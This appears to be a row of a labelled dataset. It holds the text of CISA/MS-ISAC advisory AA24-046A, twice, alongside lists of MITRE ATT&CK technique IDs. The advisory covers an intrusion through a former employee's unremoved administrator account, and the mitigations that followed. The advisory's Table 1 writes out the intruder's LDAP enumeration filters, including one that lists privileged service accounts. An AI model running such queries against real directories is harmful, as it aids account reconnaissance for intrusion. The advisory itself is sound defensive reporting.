","['T1553', 'T1550', 'T1602', 'T1087', 'T1528', 'T1136', 'T1119', 'T1014', 'T1120', 'T1613', 'T1531', 'T1535', 'T1587', 'T1565', 'T1090', 'T1578', 'T1526']","{'T1070', 'T1036.004', 'T1098.001', 'T1588.002', 'T1090.002', 'T1591.004', 'T1111', 'T1090', 'T1498', 'T1586', 'T1599', 'T1589.002', 'T1029', 'T1665', 'T1583.003', 'T1078.004', 'T1136.003', 'T1548.005', 'T1071.001', 'T1195', 'T1108', 'T1528', 'T1110.003', 'T1098.005', 'T1078', 'T1210', 'T1201', 'T1621', 'T1527', 'T1078.003'}","{'T1070', 'T1098.001', 'T1090.002', 'T1046', 'T1070.005, T1126', 'T1111', 'T1090', 'T1498, T1499', 'T1586, T1588.002', 'T1200', 'T1597', 'T1589.002', 'T1484', 'T1036', 'T1029', 'T1665', 'T1591.001', 'T1110', 'T1583.003', 'T1591.002', 'T1078.004', 'T1136.003', 'T1548.005', 'T1649', 'T1071.001', 'T1195', 'T1586.003', 'T1108', 'T1528', 'T1110.003', 'T1098.005', 'T1566.002', 'T1210', 'T1078', 'T1621', 'T1195.003', 'T1584.008', 'T1527', 'T1201', 'T1550.001', 'T1078.003'}","{'T1589', 'T1090', 'T1078, T1190', 'T1078, T1105, T1190, T1566', 'T1110, T1078', 'T1090, T1078', 'T1583', 'T1078, T1547', 'T1531', 'T1589, T1591, T1595', 'T1200', 'T1550', 'T1036', 'T1087', 'T1598', 'T1071', 'T1556', 'T1195', 'T1190', 'T1078', 'T1078, T1190, T1133', 'T1621', 'T1057, T1082, T1016', 'T1562'}"
2,https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-046a,"






Actions to take today to mitigate malicious cyber activity:




Continuously remove and disable accounts and groups from the enterprise that are no longer needed, especially privileged accounts.
Enable and enforce multifactor authentication with strong passwords.
Store credentials in a secure manner, such as with a credential manager, vault, or other privilege account management solution.







SUMMARY
The Cybersecurity and Infrastructure Security Agency (CISA) and the Multi-State Information Sharing & Analysis Center (MS-ISAC) conducted an incident response assessment of a state government organization’s network environment after documents containing host and user information, including metadata, were posted on a dark web brokerage site. Analysis confirmed that an unidentified threat actor compromised network administrator credentials through the account of a former employee—a technique commonly leveraged by threat actors—to successfully authenticate to an internal virtual private network (VPN) access point, further navigate the victim’s on-premises environment, and execute various lightweight directory access protocol (LDAP) queries against a domain controller.[1] Analysis also focused on the victim’s Azure environment, which hosts sensitive systems and data, as well as the compromised on-premises environment. Analysis determined there were no indications the threat actor further compromised the organization by moving laterally from the on-premises environment to the Azure environment.
CISA and MS-ISAC are releasing this Cybersecurity Advisory (CSA) to provide network defenders with the tactics, techniques, and procedures (TTPs) used by the threat actor and methods to protect against similar exploitation of both unnecessary and privileged accounts.
Download the PDF version of this report:


AA24-046A Threat Actor Leverages Compromised Account of Former Employee to Access State Government Organization
(PDF,       499.99 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK for Enterprise framework, version 14. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actor’s activity mapped to MITRE ATT&CK® tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
Overview
A state government organization was notified that documents containing host and user information, including metadata, were posted on a dark web brokerage site. After further investigation, the victim organization determined that the documents were accessed via the compromised account of a former employee. Threat actors commonly leverage valid accounts, including accounts of former employees that have not been properly removed from the Active Directory (AD), to gain access to organizations.[1] CISA and MS-ISAC assessed that an unidentified threat actor likely accessed documents containing host and user information to post on the dark web for profit after gaining access through the account of a former employee.
The scope of this investigation included the victim organization’s on-premises environment, as well as their Azure environment, which hosts sensitive systems and data. Analysis determined the threat actor did not move laterally from the compromised on-premises network to the Azure environment and did not compromise sensitive systems.
Untitled Goose Tool
Incident responders collected Azure and Microsoft Defender for Endpoint (MDE) logs using CISA’s Untitled Goose Tool—a free tool to help network defenders detect potentially malicious activity in Microsoft Azure, Azure Active Directory (AAD), and Microsoft 365 (M365) environments. CISA developed the Untitled Goose Tool to export and review AAD sign-in and audit logs, M365 unified audit logs (UAL), Azure activity logs, and MDE data. By exporting cloud artifacts, Untitled Goose Tool supports incident response teams with environments that do not ingest logs into a security information and event management (SIEM) tool.
Threat Actor Activity
The logs revealed the threat actor first connected from an unknown virtual machine (VM) to the victim’s on-premises environment via internet protocol (IP) addresses within their internal VPN range. CISA and MS-ISAC assessed that the threat actor connected to the VM through the victim’s VPN [T1133] with the intent to blend in with legitimate traffic to evade detection.
Initial Access: Compromised Domain Accounts
USER1: The threat actor gained initial access through the compromised account of a former employee with administrative privileges (USER1) [T1078.002] to conduct reconnaissance and discovery activities. The victim organization confirmed that this account was not disabled immediately following the employee’s departure.

The threat actor likely obtained the USER1 account credentials in a separate data breach due to the credentials appearing in publicly available channels containing leaked account information [T1589.001].
USER1 had access to two virtualized servers including SharePoint and the workstation of the former employee. The workstation was virtualized from a physical workstation using the Veeam Physical to Virtual (P2V) function within the backup software.

USER2: The threat actor likely obtained the USER2 account credentials from the virtualized SharePoint server managed by USER1 [T1213.002]. The victim confirmed that the administrator credentials for USER2 were stored locally on this server [T1552.001].

Through connection from the VM, the threat actor authenticated to multiple services [T1021] via the USER1 account, as well as from an additional compromised global domain administrator account (USER2) [T1078.002].
The threat actor’s use of the USER2 account was impactful due to the access it granted to both the on-premises AD and Azure AD [T1021.007], thus enabling administrative privileges [T1078.004].

Following notification of the dark web posting, the victim organization immediately disabled the USER1 account and took the two virtualized servers associated with the former employee offline. The victim also changed the password for the USER2 account and removed administrator privileges. Neither of the administrative accounts had multifactor authentication (MFA) enabled.
LDAP Queries
Through connection from the VM, the threat actor conducted LDAP queries of the AD, likely using the open source tool AdFind.exe, based on the format of the output. CISA and MS-ISAC assess the threat actor executed the LDAP queries [T1087.002] to collect user, host [T1018], and trust relationship information [T1482]. It is also believed the LDAP queries generated the text files the threat actor posted for sale on the dark web brokerage site: ad_users.txt, ad_computers.txt, and trustdmp.txt.
Table 1 lists all queries that were conducted between 08:39:43-08:40:56 Coordinated Universal Time (UTC).

Table 1: LDAP Queries Conducted by the Threat Actor


Query
Description




LDAP Search Scope: WholeSubtree, Base Object: dc=[REDACTED],dc=local, Search Filter: (objectCategory=CN=Person,CN=Schema,CN=Configuration,DC=[REDACTED],DC=local)
Collects names and metadata of users in the domain.


LDAP Search Scope: WholeSubtree, Base Object: dc=[REDACTED],dc=local, Search Filter: (objectCategory=CN=Computer,CN=Schema,CN=Configuration,DC=[REDACTED],DC=local)
Collects names and metadata of hosts in the domain.


LDAP Search Scope: WholeSubtree, Base Object: dc=[REDACTED],dc=local, Search Filter: (objectCategory=CN=Trusted-Domain,CN=Schema,CN=Configuration,DC=[REDACTED],DC=local)
Collects trust information in the domain.


LDAP Search Scope: WholeSubtree, Base Object: DC=[REDACTED],DC=local, Search Filter: ( &  ( &  (sAMAccountType=805306368)  (servicePrincipalName=*) ( ! (sAMAccountName=krbtgt) ) ( !  (userAccountControl&2) ) )  (adminCount=1) )
Collects Domain Administrators and Service Principals in the domain.



Service Authentication
Through the VM connection, the threat actor was observed authenticating to various services on the victim organization’s network from the USER1 and USER2 administrative accounts. In all instances, the threat actor authenticated to the Common Internet File Service (CIFS) on various endpoints [T1078.002],[T1021.002]—a protocol used for providing shared access to files and printers between machines on the network. This was likely used for file, folder, and directory discovery [T1083], and assessed to be executed in an automated manner.

USER1 authenticated to four services, presumably for the purpose of network and service discovery [T1046].
USER2 authenticated to twelve services. Note: This account had administrative privileges to both the on-premises network and Azure tenant.

MITRE ATT&CK TACTICS AND TECHNIQUES
See Tables 2-9 for all referenced threat actor’s tactics and techniques for enterprise environments in this advisory. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.

Table 2: Reconnaissance


Technique Title
ID
Use




Gather Victim Identity Information: Credentials
T1589.001
The actor likely gathered USER1 account credentials in a data breach where account information appeared in publicly available channels.




Table 3: Initial Access


Technique Title
ID
Use




Valid Accounts: Domain Accounts
T1078.002
The actor gained initial access through the compromised account of a former employee with administrative privileges (USER1). The employee’s account was not immediately disabled after their departure.




Table 4: Persistence


Technique Title
ID
Use




External Remote Services
T1133
The actor connected a VM via the victim’s VPN to blend in with legitimate traffic to evade detection.




Table 5: Privilege Escalation


Technique Title
ID
Use




Valid Accounts: Domain Accounts
T1078.002
The actor authenticated to multiple services from a compromised Global Domain Administrator account (USER2). The actor also authenticated to the Common Internet File Service (CIFS) on various endpoints.


Valid Accounts: Cloud Accounts
T1078.004
The actor used a compromised account (USER2) which was synced to both the on-premises AD and Azure AD, thus enabling administrative privileges to both the on-premises network and Azure tenant.




Table 6: Credential Access


Technique Title
ID
Use




Unsecured Credentials: Credentials in Files
T1552.001
The actor likely obtained USER2 account credentials from the virtualized SharePoint server where they were locally stored.




Table 7: Discovery


Technique Title
ID
Use




Account Discovery: Domain Account
T1087.002
Through the VM connection, the actor executed LDAP queries of the AD.


Remote System Discovery
T1018
Through the VM connection, the actor executed LDAP queries to collect user and host information.


Domain Trust Discovery
T1482
Through the VM connection, the actor executed LDAP queries to collect trust relationship information.


File and Directory Discovery
T1083
The actor authenticated to the CIFS on various endpoints likely for the purpose of file, folder, and directory discovery.


Network Service Discovery
T1046
The actor used the compromised USER1 account to authenticate to four services, presumably for the purpose of network and service discovery.




Table 8: Lateral Movement


Technique Title
ID
Use




Remote Services
T1021
The actor connected from an unknown VM and authenticated to multiple services via the USER1 account.


Remote Services: Cloud Services
T1021.007
The actor used the USER2 account, which granted access to the Azure AD, as well as the on-premises AD.


Remote Services: SMB/Windows Admin Shares
T1021.002
The actor used compromised accounts to interact with a remote network share using Server Message Block.




Table 9: Collection


Technique Title
ID
Use




Data from Information Repositories: SharePoint
T1213.002
The actor likely obtained the USER2 account credentials from the virtualized SharePoint server managed by USER1.



MITIGATIONS
Note: These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST), which apply to all critical infrastructure organizations and network defenders. The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.
Secure and Monitor Administrator Accounts
The threat actor gained access to the network via compromised administrator accounts that did not have MFA enabled. The compromised USER2 Global Domain Administrator account could have enabled the threat actor to move laterally from the on-premises environment to the Azure tenant. In response to the incident, the victim organization removed administrator privileges for USER2. Additionally, the victim organization disabled unnecessary administrator accounts and enabled MFA for all administrator accounts. To prevent similar compromises, CISA and MS-ISAC recommend the following:

Review current administrator accounts to determine their necessity and only maintain administrator accounts that are essential for network management. This will reduce the attack surface and focus efforts on the security and monitoring of necessary accounts.
Restrict the use of multiple administrator accounts for one user.
Create separate administrator accounts for on-premises and Azure environments to segment access.
Implement the principle of least privilege to decrease threat actor’s ability to access key network resources. Enable just-in-time and just enough access for administrator accounts to elevate the minimum necessary privileges for a limited time to complete tasks.
Use phishing-resistant multifactor authentication (MFA) [CPG 2.H] (e.g., security tokens) for remote access and access to any sensitive data repositories. Implement phishing-resistant MFA for as many services as possible—particularly for webmail and VPNs—for accounts that access critical systems and privileged accounts that manage backups. MFA should also be used for remote logins [M1032]. For additional guidance on secure MFA configurations, visit CISA’s More than a Password webpage and read CISA’s Implementing Phishing-Resistant MFA fact sheet.

Reduce Attack Surface
Unnecessary accounts, software, and services in the network create additional vectors for a threat actor to compromise. CISA and MS-ISAC recommend the following:

Establish policy and procedure for the prompt removal of unnecessary accounts and groups from the enterprise, especially privileged accounts. Organizations should implement a robust and continuous user management process to ensure accounts of offboarded employees are removed and can no longer access the network.
Maintain a robust asset management policy through comprehensive documentation of assets, tracking current version information to maintain awareness of outdated software, and mapping assets to business and critical functions.

Determine the need and functionality of assets that require public internet exposure [CPG 1.A].


Follow a routine patching cycle for all operating systems, applications, and software (including all third-party software) to mitigate the potential for exploitation.
Restrict personal devices from connecting to the network. Personal devices are not subject to the same group policies and security measures as domain joined devices.

Evaluate Tenant Settings
By default, in Azure AD all users can register and manage all aspects of applications they create. Users can also determine and approve what organizational data and services the application can access. These default settings can enable a threat actor to access sensitive information and move laterally in the network. In addition, users who create an Azure AD automatically become the Global Administrator for that tenant. This could allow a threat actor to escalate privileges to execute malicious actions. CISA and MS-ISAC recommend the following:

Evaluate current user permissions in the Azure tenant to restrict potentially harmful permissions including:

Restrict users’ ability to register applications. By default, all users in Azure AD can register and manage the applications they create and approve the data and services the application can access. If this is exploited, a threat actor can access sensitive information and move laterally in the network.
Restrict non-administrators from creating tenants. Any user who creates an Azure AD automatically becomes the Global Administrator for that tenant. This creates an opportunity for a threat actor to escalate privileges to the highest privileged account.
Restrict access to the Azure AD portal to administrators only. Users without administrative privileges cannot change settings, however, they can view user info, group info, device details, and user privileges. This would allow a threat actor to gather valuable information for malicious activities.



Create a Forensically Ready Organization

Collect access- and security-focused logs (e.g., intrusion detection systems/intrusion prevention systems, firewall, data loss prevention, and virtual private network) for use in both detection and incident response activities [CPG 2.T].
Enable complete coverage of tools, including Endpoint Detection and Response (EDR), across the environment for thorough analysis of anomalous activity and remediation of potential vulnerabilities.

Assess Security Configuration of Azure Environment
CISA created the Secure Cloud and Business Applications (SCuBA) assessment tool to help Federal Civilian Executive Branch (FCEB) agencies to verify that a M365 tenant configuration conforms to a minimal viable secure configuration baseline. Although the SCuBA assessment tool was developed for FCEB, other organizations can benefit from its output. CISA and MS-ISAC recommend the following:

Use tools that identify attack paths. This will enable defenders to identify common attack paths used by threat actors and shut them down before they are exploited.
Review the security recommendations list provided by Microsoft 365 Defender. Focus remediation on critical vulnerabilities on endpoints that are essential to mission execution and contain sensitive data.

Evaluate Conditional Access Policies
Conditional access policies require users who want to access a resource to complete an action. Conditional access policies also account for common signals, such as user or group memberships, IP location information, device, application, and risky sign-in behavior identified through integration with Azure AD Identity Protection.

Review current conditional access policies to determine if changes are necessary.

Reset All Passwords and Establish Secure Password Policies
In response to the incident, the victim organization reset passwords for all users.

Employ strong password management alongside other attribute-based information, such as device information, time of access, user history, and geolocation data. Set a password policy to require complex passwords for all users (minimum of 16 characters) and enforce this new requirement as user passwords expire [CPG 2.A],[CPG 2.B],[CPG 2.C].
Store credentials in a secure manner, such as with a credential manager, vault, or other privileged account management solution [CPG 2.L].
For products that come with default passwords, ask vendors how they plan to eliminate default passwords, as highlighted in CISA’s Secure by Design Alert: How Manufacturers Can Protect Customers by Eliminating Default Passwords.

Mitigations for Vendors
CISA recommends that vendors incorporate secure by design principles and tactics into their practices, limiting the impact of threat actor techniques and strengthening the secure posture for their customers.

Prioritize secure by default configurations, such as eliminating default passwords and providing high-quality audit logs to customers with no additional configuration, at no extra charge. Secure by default configurations should be prioritized to eliminate the need for customer implementation of hardening guidance.
Immediately identify, mitigate, and update affected products that are not patched in accordance with CISA’s Known Exploited Vulnerabilities (KEV) catalog.
Implement multifactor authentication (MFA), ideally phishing-resistant MFA, as a default (rather than opt-in) feature for all products.

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, CISA and MS-ISAC recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. CISA recommends testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see table 2-9).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

CISA and MS-ISAC recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES

MS-ISAC: Center for Internet Security (CIS) Cyber-Attack Defense: CIS Benchmarks + CDM + MITRE ATT&CK

REFERENCES
[1] CISA Analysis: Fiscal Year 2022 Risk and Vulnerability Assessments
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. CISA and MS-ISAC do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by CISA or MS-ISAC.
VERSION HISTORY
February 15, 2024: Initial version.






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1021.007', 'T1083', 'T1087.002', 'T1552.001', 'T1021', 'T1018', 'T1021.002', 'T1046', 'T1133', 'T1078.004', 'T1078.002', 'T1213.002', 'T1482', 'T1589.001'}","






Actions to take today to mitigate malicious cyber activity:




Continuously remove and disable accounts and groups from the enterprise that are no longer needed, especially privileged accounts.
Enable and enforce multifactor authentication with strong passwords.
Store credentials in a secure manner, such as with a credential manager, vault, or other privilege account management solution.







SUMMARY
The Cybersecurity and Infrastructure Security Agency (CISA) and the Multi-State Information Sharing & Analysis Center (MS-ISAC) conducted an incident response assessment of a state government organization’s network environment after documents containing host and user information, including metadata, were posted on a dark web brokerage site. Analysis confirmed that an unidentified threat actor compromised network administrator credentials through the account of a former employee—a technique commonly leveraged by threat actors—to successfully authenticate to an internal virtual private network (VPN) access point, further navigate the victim’s on-premises environment, and execute various lightweight directory access protocol (LDAP) queries against a domain controller.,1, Analysis also focused on the victim’s Azure environment, which hosts sensitive systems and data, as well as the compromised on-premises environment. Analysis determined there were no indications the threat actor further compromised the organization by moving laterally from the on-premises environment to the Azure environment.
CISA and MS-ISAC are releasing this Cybersecurity Advisory (CSA) to provide network defenders with the tactics, techniques, and procedures (TTPs) used by the threat actor and methods to protect against similar exploitation of both unnecessary and privileged accounts.
Download the PDF version of this report:


AA24-046A Threat Actor Leverages Compromised Account of Former Employee to Access State Government Organization
(PDF,       499.99 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK for Enterprise framework, version 14. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actor’s activity mapped to MITRE ATT&CK® tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
Overview
A state government organization was notified that documents containing host and user information, including metadata, were posted on a dark web brokerage site. After further investigation, the victim organization determined that the documents were accessed via the compromised account of a former employee. Threat actors commonly leverage valid accounts, including accounts of former employees that have not been properly removed from the Active Directory (AD), to gain access to organizations.,1, CISA and MS-ISAC assessed that an unidentified threat actor likely accessed documents containing host and user information to post on the dark web for profit after gaining access through the account of a former employee.
The scope of this investigation included the victim organization’s on-premises environment, as well as their Azure environment, which hosts sensitive systems and data. Analysis determined the threat actor did not move laterally from the compromised on-premises network to the Azure environment and did not compromise sensitive systems.
Untitled Goose Tool
Incident responders collected Azure and Microsoft Defender for Endpoint (MDE) logs using CISA’s Untitled Goose Tool—a free tool to help network defenders detect potentially malicious activity in Microsoft Azure, Azure Active Directory (AAD), and Microsoft 365 (M365) environments. CISA developed the Untitled Goose Tool to export and review AAD sign-in and audit logs, M365 unified audit logs (UAL), Azure activity logs, and MDE data. By exporting cloud artifacts, Untitled Goose Tool supports incident response teams with environments that do not ingest logs into a security information and event management (SIEM) tool.
Threat Actor Activity
The logs revealed the threat actor first connected from an unknown virtual machine (VM) to the victim’s on-premises environment via internet protocol (IP) addresses within their internal VPN range. CISA and MS-ISAC assessed that the threat actor connected to the VM through the victim’s VPN, with the intent to blend in with legitimate traffic to evade detection.
Initial Access: Compromised Domain Accounts
USER1: The threat actor gained initial access through the compromised account of a former employee with administrative privileges (USER1), to conduct reconnaissance and discovery activities. The victim organization confirmed that this account was not disabled immediately following the employee’s departure.

The threat actor likely obtained the USER1 account credentials in a separate data breach due to the credentials appearing in publicly available channels containing leaked account information,.
USER1 had access to two virtualized servers including SharePoint and the workstation of the former employee. The workstation was virtualized from a physical workstation using the Veeam Physical to Virtual (P2V) function within the backup software.

USER2: The threat actor likely obtained the USER2 account credentials from the virtualized SharePoint server managed by USER1,. The victim confirmed that the administrator credentials for USER2 were stored locally on this server,.

Through connection from the VM, the threat actor authenticated to multiple services, via the USER1 account, as well as from an additional compromised global domain administrator account (USER2),.
The threat actor’s use of the USER2 account was impactful due to the access it granted to both the on-premises AD and Azure AD, thus enabling administrative privileges,.

Following notification of the dark web posting, the victim organization immediately disabled the USER1 account and took the two virtualized servers associated with the former employee offline. The victim also changed the password for the USER2 account and removed administrator privileges. Neither of the administrative accounts had multifactor authentication (MFA) enabled.
LDAP Queries
Through connection from the VM, the threat actor conducted LDAP queries of the AD, likely using the open source tool AdFind.exe, based on the format of the output. CISA and MS-ISAC assess the threat actor executed the LDAP queries, to collect user, host, and trust relationship information,. It is also believed the LDAP queries generated the text files the threat actor posted for sale on the dark web brokerage site: ad_users.txt, ad_computers.txt, and trustdmp.txt.
Table 1 lists all queries that were conducted between 08:39:43-08:40:56 Coordinated Universal Time (UTC).

Service Authentication
Through the VM connection, the threat actor was observed authenticating to various services on the victim organization’s network from the USER1 and USER2 administrative accounts. In all instances, the threat actor authenticated to the Common Internet File Service (CIFS) on various endpoints,—a protocol used for providing shared access to files and printers between machines on the network. This was likely used for file, folder, and directory discovery, and assessed to be executed in an automated manner.

USER1 authenticated to four services, presumably for the purpose of network and service discovery,.
USER2 authenticated to twelve services. Note: This account had administrative privileges to both the on-premises network and Azure tenant.

MITRE ATT&CK TACTICS AND TECHNIQUES
See Tables 2-9 for all referenced threat actor’s tactics and techniques for enterprise environments in this advisory. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.








MITIGATIONS
Note: These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST), which apply to all critical infrastructure organizations and network defenders. The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.
Secure and Monitor Administrator Accounts
The threat actor gained access to the network via compromised administrator accounts that did not have MFA enabled. The compromised USER2 Global Domain Administrator account could have enabled the threat actor to move laterally from the on-premises environment to the Azure tenant. In response to the incident, the victim organization removed administrator privileges for USER2. Additionally, the victim organization disabled unnecessary administrator accounts and enabled MFA for all administrator accounts. To prevent similar compromises, CISA and MS-ISAC recommend the following:

Review current administrator accounts to determine their necessity and only maintain administrator accounts that are essential for network management. This will reduce the attack surface and focus efforts on the security and monitoring of necessary accounts.
Restrict the use of multiple administrator accounts for one user.
Create separate administrator accounts for on-premises and Azure environments to segment access.
Implement the principle of least privilege to decrease threat actor’s ability to access key network resources. Enable just-in-time and just enough access for administrator accounts to elevate the minimum necessary privileges for a limited time to complete tasks.
Use phishing-resistant multifactor authentication (MFA),CPG 2.H, (e.g., security tokens) for remote access and access to any sensitive data repositories. Implement phishing-resistant MFA for as many services as possible—particularly for webmail and VPNs—for accounts that access critical systems and privileged accounts that manage backups. MFA should also be used for remote logins,M1032,. For additional guidance on secure MFA configurations, visit CISA’s More than a Password webpage and read CISA’s Implementing Phishing-Resistant MFA fact sheet.

Reduce Attack Surface
Unnecessary accounts, software, and services in the network create additional vectors for a threat actor to compromise. CISA and MS-ISAC recommend the following:

Establish policy and procedure for the prompt removal of unnecessary accounts and groups from the enterprise, especially privileged accounts. Organizations should implement a robust and continuous user management process to ensure accounts of offboarded employees are removed and can no longer access the network.
Maintain a robust asset management policy through comprehensive documentation of assets, tracking current version information to maintain awareness of outdated software, and mapping assets to business and critical functions.

Determine the need and functionality of assets that require public internet exposure,CPG 1.A,.


Follow a routine patching cycle for all operating systems, applications, and software (including all third-party software) to mitigate the potential for exploitation.
Restrict personal devices from connecting to the network. Personal devices are not subject to the same group policies and security measures as domain joined devices.

Evaluate Tenant Settings
By default, in Azure AD all users can register and manage all aspects of applications they create. Users can also determine and approve what organizational data and services the application can access. These default settings can enable a threat actor to access sensitive information and move laterally in the network. In addition, users who create an Azure AD automatically become the Global Administrator for that tenant. This could allow a threat actor to escalate privileges to execute malicious actions. CISA and MS-ISAC recommend the following:

Evaluate current user permissions in the Azure tenant to restrict potentially harmful permissions including:

Restrict users’ ability to register applications. By default, all users in Azure AD can register and manage the applications they create and approve the data and services the application can access. If this is exploited, a threat actor can access sensitive information and move laterally in the network.
Restrict non-administrators from creating tenants. Any user who creates an Azure AD automatically becomes the Global Administrator for that tenant. This creates an opportunity for a threat actor to escalate privileges to the highest privileged account.
Restrict access to the Azure AD portal to administrators only. Users without administrative privileges cannot change settings, however, they can view user info, group info, device details, and user privileges. This would allow a threat actor to gather valuable information for malicious activities.



Create a Forensically Ready Organization

Collect access- and security-focused logs (e.g., intrusion detection systems/intrusion prevention systems, firewall, data loss prevention, and virtual private network) for use in both detection and incident response activities,CPG 2.T,.
Enable complete coverage of tools, including Endpoint Detection and Response (EDR), across the environment for thorough analysis of anomalous activity and remediation of potential vulnerabilities.

Assess Security Configuration of Azure Environment
CISA created the Secure Cloud and Business Applications (SCuBA) assessment tool to help Federal Civilian Executive Branch (FCEB) agencies to verify that a M365 tenant configuration conforms to a minimal viable secure configuration baseline. Although the SCuBA assessment tool was developed for FCEB, other organizations can benefit from its output. CISA and MS-ISAC recommend the following:

Use tools that identify attack paths. This will enable defenders to identify common attack paths used by threat actors and shut them down before they are exploited.
Review the security recommendations list provided by Microsoft 365 Defender. Focus remediation on critical vulnerabilities on endpoints that are essential to mission execution and contain sensitive data.

Evaluate Conditional Access Policies
Conditional access policies require users who want to access a resource to complete an action. Conditional access policies also account for common signals, such as user or group memberships, IP location information, device, application, and risky sign-in behavior identified through integration with Azure AD Identity Protection.

Review current conditional access policies to determine if changes are necessary.

Reset All Passwords and Establish Secure Password Policies
In response to the incident, the victim organization reset passwords for all users.

Employ strong password management alongside other attribute-based information, such as device information, time of access, user history, and geolocation data. Set a password policy to require complex passwords for all users (minimum of 16 characters) and enforce this new requirement as user passwords expire,CPG 2.A,CPG 2.B,CPG 2.C,.
Store credentials in a secure manner, such as with a credential manager, vault, or other privileged account management solution,CPG 2.L,.
For products that come with default passwords, ask vendors how they plan to eliminate default passwords, as highlighted in CISA’s Secure by Design Alert: How Manufacturers Can Protect Customers by Eliminating Default Passwords.

Mitigations for Vendors
CISA recommends that vendors incorporate secure by design principles and tactics into their practices, limiting the impact of threat actor techniques and strengthening the secure posture for their customers.

Prioritize secure by default configurations, such as eliminating default passwords and providing high-quality audit logs to customers with no additional configuration, at no extra charge. Secure by default configurations should be prioritized to eliminate the need for customer implementation of hardening guidance.
Immediately identify, mitigate, and update affected products that are not patched in accordance with CISA’s Known Exploited Vulnerabilities (KEV) catalog.
Implement multifactor authentication (MFA), ideally phishing-resistant MFA, as a default (rather than opt-in) feature for all products.

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, CISA and MS-ISAC recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. CISA recommends testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see table 2-9).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

CISA and MS-ISAC recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES

MS-ISAC: Center for Internet Security (CIS) Cyber-Attack Defense: CIS Benchmarks + CDM + MITRE ATT&CK

REFERENCES,1, CISA Analysis: Fiscal Year 2022 Risk and Vulnerability Assessments
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. CISA and MS-ISAC do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by CISA or MS-ISAC.
VERSION HISTORY
February 15, 2024: Initial version.






This product is provided subject to this Notification and this Privacy & Use policy.


